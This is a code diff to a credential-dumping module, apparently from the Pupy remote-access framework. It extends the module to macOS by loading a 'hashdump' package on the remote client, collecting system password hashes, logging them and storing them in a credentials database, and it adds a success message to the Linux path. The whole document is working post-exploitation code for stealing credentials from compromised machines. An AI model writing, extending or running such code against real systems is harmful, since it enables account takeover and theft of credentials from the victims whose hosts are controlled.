@@ -34,7 +34,7 @@ from modules.lib.windows.creddump.win32.lsasecrets import get_file_secrets
 
 __class_name__="CredDump"
 
-@config(cat="creds", compatibilities=['windows', 'linux'], tags=['creds',
+@config(cat="creds", compatibilities=['windows', 'linux', 'darwin'], tags=['creds',
     'credentials', 'password', 'gather', 'hives'])
 class CredDump(PupyModule):
 
@@ -52,8 +52,25 @@ class CredDump(PupyModule):
 
         if self.client.is_windows():
             self.windows()
-        else:
+        elif self.client.is_linux():
             self.linux()
+        elif self.client.is_darwin():
+            self.darwin()
+
+    def darwin(self):
+        self.client.load_package("hashdump")
+        hashes = self.client.conn.modules["hashdump"].hashdump()
+        if hashes:
+            db = Credentials()
+            db.add([
+                {'Hash':hsh[1], 'Login': hsh[0], 'Category': 'System hash', 'uid':self.client.short_name(), 'CredType': 'hash'} for hsh in hashes
+            ])
+            for hsh in hashes:
+                self.log('{}'.format(hsh))
+            
+            self.success("Hashes stored on the database")
+        else:
+            self.error('no hashes found')
 
     def linux(self):
         known = set()
@@ -123,6 +140,8 @@ class CredDump(PupyModule):
 
         for hsh in hashes:
             self.log('{}'.format(hsh))
+        
+        self.success("Hashes stored on the database")
 
     def windows(self):
         # First, we download the hives...
